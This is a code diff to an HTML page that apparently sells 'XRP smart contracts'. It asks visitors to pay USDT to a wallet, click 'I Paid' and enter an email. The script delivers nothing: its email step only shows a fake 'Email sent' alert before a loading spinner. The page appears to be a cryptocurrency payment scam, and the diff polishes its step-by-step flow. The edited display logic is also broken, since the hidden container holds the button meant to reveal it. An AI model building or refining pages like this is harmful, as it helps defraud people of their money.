@@ -26,6 +26,7 @@
       box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
       width: 400px;
       text-align: center;
+      display: none;
     }
 
     h1 {
@@ -103,16 +104,16 @@
   </style>
 </head>
 <body>
-  <div class="container">
+  <div class="container" id="container">
     <h1>NEW CONTRACT</h1>
     <div class="subtitle">
       This platform provides the sale and creation of <b>XRP smart contracts</b>.<br>
       You can create contracts on the <b>XRP Ledger (Ripple Blockchain)</b> and receive your finalized contract via email.
     </div>
     <!-- Step 1 -->
-    <button class="btn" onclick="showPayment()">Create XRP Contract</button>
+    <button class="btn" id="createBtn" onclick="showPayment()">Create XRP Contract</button>
     <!-- Step 2 -->
-    <div class="section" id="payment">
+    <div class="section" id="payment" style="display: none;">
       <div class="info">
         Payment Network: <b>USDT BSC (BEP20)</b><br><br>
         Wallet Address:<br>
@@ -125,7 +126,7 @@
       <button class="btn" onclick="showEmail()">I Paid</button>
     </div>
     <!-- Step 3 -->
-    <div class="section" id="emailBox">
+    <div class="section" id="emailBox" style="display: none;">
       <input
         type="email"
         id="emailInput"
@@ -135,7 +136,7 @@
       <button class="btn" id="confirmBtn" onclick="sendEmail()" disabled>Confirm</button>
     </div>
     <!-- Step 4 -->
-    <div class="section" id="status">
+    <div class="section" id="status" style="display: none;">
       <div class="loader"></div>
       <p>
         If the payment is completed successfully,<br>
@@ -146,7 +147,9 @@
 
   <script>
     function showPayment() {
+      document.getElementById('container').style.display = 'block';
       document.getElementById('payment').style.display = 'block';
+      document.getElementById('createBtn').style.display = 'none';
     }
 
     function copyAddress() {
@@ -156,6 +159,7 @@
     }
 
     function showEmail() {
+      document.getElementById('payment').style.display = 'none';
       document.getElementById('emailBox').style.display = 'block';
     }
 
@@ -168,6 +172,7 @@
     function sendEmail() {
       const email = document.getElementById('emailInput').value;
       alert(`Email sent to: ${email}`);
+      document.getElementById('emailBox').style.display = 'none';
       document.getElementById('status').style.display = 'block';
     }
   </script>
